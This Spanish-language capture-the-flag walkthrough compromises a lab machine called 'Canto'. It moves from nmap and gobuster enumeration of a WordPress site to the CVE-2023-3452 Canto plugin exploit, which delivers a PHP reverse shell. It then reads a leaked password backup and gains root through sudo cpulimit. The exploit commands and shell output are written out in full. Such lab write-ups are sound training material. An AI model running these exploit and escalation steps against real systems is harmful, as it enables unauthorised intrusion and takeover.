Empezaremos haciendo un escaneo de puertos a la ip de la máquina víctima:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn ip
```

Y vemos los puertos abiertos:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c6:af:18:21:fa:3f:3c:fc:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKkMLZHCokv5rpKTUUfitgdTSiyieZXC1kqsQS8DEnLgk6x5fOmlzHim2qgiwoJhyEJa7Nj1k3K6pwm5RVxEjEU=
|   256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDR8+o8qabpIHzS2zgBZDxfX0Tm5eWBBstEt5QeYN04+
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Ubuntu))
|_http-title: Canto
|_http-generator: WordPress 6.8.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.57 (Ubuntu)
```

A continuación, al ver el puerto 80, ponemos la ip en el navegador y haremos fuzzing web:

```
gobuster dir -u http://ip -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,bak
```

Al fuzzear vemos que detrás del puerto 80 hay un wordpress:

```
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--> http://ip/]
/wp-content           (Status: 301) [Size: 317] [--> http://ip/wp-content/]
/wp-login.php         (Status: 200) [Size: 5194]
/license.txt          (Status: 200) [Size: 19903]
/wp-includes          (Status: 301) [Size: 318] [--> http://ip/wp-includes/]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 315] [--> http://ip/wp-admin/]
```

Y encontramos un panel de login, donde intentanto sacar usuarios y contraseñas no nos ha ido muy bien, solo conseguimos sacar el usuario erik,  por tanto buscaremos plugins vulnerables

```
wpscan --url "http://ip" -e u,p
```

```
[i] Plugin(s) Identified:

[+] *
 | Location: http://ip/wp-content/plugins/*/
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | The version could not be determined.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] erik
```

Con el diccionario predeterminado no nos encuentra ningún plugin. Buscaremos en internet algún diccionario de plugins de wordpress.

Antes de todo, en el directorio que nos sacó go buster de *wp-content*, buscamos en el navegador la siguiente ruta:

```
http://ip/wp-content/plugins/
```

Si nos sale una pantalla en blanco, significa que el directorio existe, por tanto debemos hacer el fuzzing de los plugins a esa dirección:

```
gobuster dir -u http://ip/wp-content/plugins -w /usr/share/wordlists/plugins.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ip/wp-content/plugins
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/plugins.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/akismet              (Status: 301) [Size: 333] [--> http://ip/wp-content/plugins/akismet/]
/canto                (Status: 301) [Size: 331] [--> http://ip/wp-content/plugins/canto/]
```

Nos encuentra el plugin canto, buscamos en el navegador la url que nos da gobuster y confirmamos que existe al verse una pantalla en blanco

En este punto deberemos buscar en google un exploit de la vulnerabilidad del plugin *canto*

Encontramos que existe un CVE de este plugin:

```
CVE-2023-3452-PoC
```

Nos lo clonamos:

```
git clone https://github.com/leoanggal1/CVE-2023-3452-PoC.git
```

(*Es posible que haya que actualizar o descargar la librería requests de python*):

```
pip instal requests y/o

sudo apt install python3-requests
```

Nos leemos las instrucciones y nos dice que usemos la reverse-shell de pentest-monkey, por tanto la clonamos también, le ponemos bien la ip y puerto y quedaría asi el exploit para ejecutar:

```
python3 CVE-2023-3452.py -u http://ip_victima -LHOST ip_anfritión -NC_PORT 443 -s pentest_monkey.php
```

Lo ejetuamos y:

```
python3 CVE-2023-3452.py -u http://ip -LHOST ip -NC_PORT 4443 -s pentest_monkey.php
Exploitation URL: http://ip/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://ip:8080&cmd=whoami
listening on [any] 4443 ...
Local web server on port 8080...
ip - - [08/Jul/2025 11:54:59] "GET /wp-admin/admin.php HTTP/1.1" 200 -
ip: inverse host lookup failed: Unknown host
connect to [ip] from (UNKNOWN) [ip] 56416
Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 15:54:58 up 3 min,  0 user,  load average: 0.22, 0.23, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ya estamos dentro del servidor, ahora debemos escalar privilegios

Hacemos un tratamiento de la tty:

```
script /dev/null -c bash

stty raw -echo; fg 
reset xterm 
export TERM=xterm
export SHELL=bash
```

Y nos ubicamos en la home de erik:

```
www-data@canto:/home/erik$ ls
notes  user.txt
```

Donde vemos un .txt, el cual no tenemos permisos para leer y una carpeta de notes.

La nota importante es la nota 2 que dice que ha hecho un backup, con su usuario, por tanto buscaremos ese backup 

Encontramos ese backup y conseguimos su contraseña:

```
www-data@canto:/$ cd var
www-data@canto:/var$ ls
backups  crash  local  log   opt  snap   tmp        www
cache    lib    lock   mail  run  spool  wordpress
www-data@canto:/var$ cd wordpress/
www-data@canto:/var/wordpress$ ls
backups
www-data@canto:/var/wordpress$ cd backups/
www-data@canto:/var/wordpress/backups$ ls
12052024.txt
www-data@canto:/var/wordpress/backups$ cat 12052024.txt 
------------------------------------
| Users     |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |
------------------------------------
www-data@canto:/var/wordpress/backups$ 
```

Así que nos conectaremos por ssh al usuario erik. El user.txt que habíamos visto antes sería nada más que la flag:

```
erik@canto:~$ cat user.txt 
d41d8cd98f00b204e9800998ecf8427e
erik@canto:~$
```

Ahora hay que llegar a ser root, con un sudo -l vemos lo siguiente:

```
erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
erik@canto:~$ 
```

Podemos ejecutar con permisos de root *cpulimit*, buscaremos en gtfobins, como explotarlo:

```
erik@canto:~$ sudo cpulimit -l 100 -f /bin/sh
Process 1011 detected
# whoami
root
# 
```

Y finalmente pwned ;)


